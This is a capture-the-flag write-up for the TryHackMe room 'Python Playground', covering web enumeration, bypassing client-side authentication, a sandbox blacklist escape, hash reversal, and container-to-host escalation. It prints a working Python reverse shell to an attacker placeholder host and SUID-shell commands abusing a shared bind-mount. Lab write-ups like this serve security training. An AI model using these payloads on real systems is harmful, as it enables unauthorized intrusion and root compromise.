<div align="center">

```
██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗    ██████╗ ██╗      █████╗ ██╗   ██╗ ██████╗ ██████╗  ██████╗ ██╗   ██╗███╗   ██╗██████╗
██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║    ██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝██╔════╝ ██╔══██╗██╔═══██╗██║   ██║████╗  ██║██╔══██╗
██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║    ██████╔╝██║     ███████║ ╚████╔╝ ██║  ███╗██████╔╝██║   ██║██║   ██║██╔██╗ ██║██║  ██║
██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║    ██╔═══╝ ██║     ██╔══██║  ╚██╔╝  ██║   ██║██╔══██╗██║   ██║██║   ██║██║╚██╗██║██║  ██║
██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║    ██║     ███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝
```

### `Python Playground` — TryHackMe Room Writeup

*A "foolproof" server-side code sandbox, a homebrew client-side hash, and a mounted log directory that root shouldn't have trusted.*

[](https://tryhackme.com/room/pythonplayground)
[](#)
[](#)
[](#)

</div>

---

## `0x00` Overview

| Field | Detail |
|---|---|
| **Room** | Python Playground |
| **Platform** | TryHackMe |
| **Scenario** | A "secure" server-side Python code sandbox protected by a blacklist filter and a client-side-only admin login |
| **Attack Surface** | Node.js/Express web server, hidden admin panel, in-browser Python execution console, SSH, a Docker bind-mount shared between host and container |
| **Core Weaknesses** | Blacklist-based input filtering on a code sandbox (bypassable via `__import__`), a security control implemented entirely in client-side JavaScript, and a shared bind-mount that lets a root-level container write a SUID binary back onto the host |
| **Objective** | Enumerate the web app → locate the hidden admin panel → reach the Python execution console → bypass the blacklist for RCE → capture Flag 1 → reverse the client-side hash to recover Connor's password → SSH in for Flag 2 → abuse the shared mount to plant a SUID shell → escalate to root for Flag 3 |
| **Author** | Kitsana Thuekoh ([@vetementsvmnts](https://github.com/vetementsvmnts)) |

---

## `0x01` Attack Chain

```mermaid
flowchart LR
    A[Nmap Scan] --> B[Gobuster Web Enumeration]
    B --> C[Admin Portal Source Review]
    C --> D[PyExec Sandbox Discovery]
    D --> E[Blacklist / Threat Detection Triggered]
    E --> F[__import__ Bypass -> RCE]
    F --> G[Reverse Shell as root in Container]
    G --> H[Flag 1]
    C --> I[Reverse Client-Side Hash Algorithm]
    I --> J[Recover Connor's Password]
    J --> K[SSH Foothold]
    K --> L[Flag 2]
    G --> M[Plant SUID Shell on Shared /mnt/log Mount]
    K --> N[Execute SUID Shell via SSH Session]
    M --> N
    N --> O[Root on Host]
    O --> P[Flag 3]

    style A fill:#0d1117,stroke:#00FF41,color:#00FF41
    style B fill:#0d1117,stroke:#00FF41,color:#00FF41
    style C fill:#0d1117,stroke:#00FF41,color:#00FF41
    style D fill:#0d1117,stroke:#00FF41,color:#00FF41
    style E fill:#0d1117,stroke:#ff2020,color:#ff2020
    style F fill:#0d1117,stroke:#ff2020,color:#ff2020
    style G fill:#0d1117,stroke:#00FF41,color:#00FF41
    style H fill:#0d1117,stroke:#00FF41,color:#00FF41
    style I fill:#0d1117,stroke:#00FF41,color:#00FF41
    style J fill:#0d1117,stroke:#ff2020,color:#ff2020
    style K fill:#0d1117,stroke:#00FF41,color:#00FF41
    style L fill:#0d1117,stroke:#00FF41,color:#00FF41
    style M fill:#0d1117,stroke:#ff2020,color:#ff2020
    style N fill:#0d1117,stroke:#00FF41,color:#00FF41
    style O fill:#0d1117,stroke:#ff2020,color:#ff2020
    style P fill:#0d1117,stroke:#00FF41,color:#00FF41
```



---

## `0x02` Reconnaissance

An initial `nmap` scan against the target identified two open services:

- **Port 22/tcp** — `OpenSSH 7.6p1` (Ubuntu)
- **Port 80/tcp** — Node.js / Express, hosting a page advertising a "foolproof" server-side Python code sandbox

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

<div align="center">

</div>

---

## `0x03` Web Enumeration — Gobuster

The landing page's *Login* and *Sign Up* links both returned a message stating that only admins could currently use the site. `gobuster` was run against the web root to uncover any pages not linked from the UI.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/dirb/wordlists/common.txt -x html
```

The scan surfaced `admin.html` — a hidden login form titled *"Connor's Secret Admin Backdoor"* not referenced anywhere on the public site.

<div align="center">

</div>

---

## `0x04` Admin Portal Source Review

With direct login credentials unknown, the page source of `admin.html` was reviewed. The authentication logic — including the username check and password verification — was implemented **entirely client-side** in JavaScript, with a custom two-pass character-shifting hash function comparing the submitted password against a hardcoded hash string.

Because the validation runs only in the browser, the redirect target (`super-secret-admin-testing-panel.html`) was reachable directly, without ever solving the hash at this stage.

> **Takeaway:** A security control that only exists in client-side JavaScript is not a security control — it's a suggestion the browser is free to ignore.

<div align="center">

<br><br>

<br><br>

</div>

---

## `0x05` PyExec Sandbox — Discovery & Blacklist / Threat Detection

Navigating directly to `super-secret-admin-testing-panel.html` exposed the advertised **Python execution console**, letting arbitrary Python run server-side. The room's own description bragged about a "foolproof blacklist" — and the first naive payload confirmed it: attempting a plain `import os` tripped the filter and returned a blocked / threat-detected response.

<div align="center">

<br><br>

</div>

---

## `0x06` Blacklist Bypass — Reverse Shell & Flag 1

The filter blocked the literal `import` keyword but not Python's `__import__()` builtin. Modules were pulled in through `__import__()` instead, letting a raw socket be built and duplicated over stdin/stdout/stderr to spawn an interactive shell back to a listener.

```python
o = __import__('os')
s = __import__('socket')
p = __import__('subprocess')

k = s.socket(s.AF_INET, s.SOCK_STREAM)
k.connect(("<ATTACKER_IP>", 7345))
o.dup2(k.fileno(), 0)
o.dup2(k.fileno(), 1)
o.dup2(k.fileno(), 2)
p.call(["/bin/sh", "-i"])
```

```bash
nc -lvnp 7345
```

The resulting shell landed as **root inside the sandbox's Docker container**, where `/root/flag1.txt` was sitting alongside the sandboxed app directory.

<div align="center">

</div>

---

## `0x07` Hash Reversal — Connor's Password & Flag 2

Separately from the sandbox path, the custom hash function pulled from `admin.html` (`string_to_int_array` / `int_array_to_text`, each run twice) was reimplemented in Python and reversed against the hardcoded hash string to recover Connor's actual plaintext password — since the "secure" scheme was fully invertible once its logic was known.

```bash
python3 crack_connor_hash.py
# Connor's password is: <recovered_password>
```

With valid credentials in hand, SSH access was established directly on the host (separate from the sandbox's container), where `flag2.txt` was waiting in Connor's home directory.

<div align="center">

</div>

---

## `0x08` SUID Escalation via Shared Mount — Root & Flag 3

Back in the root shell inside the sandbox container, filesystem enumeration revealed `/mnt/log` — a directory bind-mounted between the container and the host. Since the container shell already had root, a copy of `/bin/sh` was dropped into the shared mount and given the SUID bit, making it available on the **host** side as well, inherited from Connor's SSH session.

```bash
# Inside the root container shell
cp /bin/sh /mnt/log
chmod +s /mnt/log/sh
```

```bash
# Back on the host, from Connor's SSH session
/var/log/sh -p
```

The SUID binary executed with root privileges on the host, completing the escalation and revealing `flag3.txt` in `/root`.

<div align="center">

<br><br>

</div>

---

## `0x09` Room Completion

Room completed with all flags captured.

<div align="center">

</div>

---

## `0x0A` MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning | T1595 |
| Discovery | Network Service Discovery | T1046 |
| Discovery | Web Content Discovery (Gobuster) | T1595.003 |
| Defense Evasion | Deobfuscate/Decode Files or Information (blacklist / filter bypass) | T1140 |
| Initial Access | Exploit Public-Facing Application (`__import__` sandbox escape) | T1190 |
| Execution | Command and Scripting Interpreter — Python | T1059.006 |
| Credential Access | Brute Force — Cryptanalysis of a custom hash | T1110 |
| Lateral Movement | Remote Services — SSH | T1021.004 |
| Privilege Escalation | Setuid and Setgid Abuse | T1548.001 |
| Privilege Escalation | Escape to Host (container bind-mount abuse) | T1611 |

---

## `0x0B` Lessons Learned

- **Blacklists are a losing game.** Filtering the literal string `import` does nothing against `__import__()`, dynamic attribute access, or any of the dozen other ways Python can load a module.
- **Client-side auth is not auth.** Connor's login logic lived entirely in JavaScript the browser would happily skip — the "protected" page was one URL bar away the whole time.
- **A reversible hash is not a hash.** A deterministic, invertible character-shift scheme is trivially reimplemented and solved backward; it offers no real protection for a password.
- **Shared bind-mounts break container isolation.** Root inside a container is not a security boundary if that container can write into a directory the host also trusts — a SUID binary dropped through the mount walked straight out to the host.

---

## `0x0C` Room Link

🔗 [TryHackMe — Python Playground](https://tryhackme.com/room/pythonplayground)

---

<div align="center">

`root@target:~#` **Room completed — 3/3 flags captured**

*Writeup by [Kitsana Thuekoh](https://github.com/vetementsvmnts) · Offensive Security Portfolio*

</div>
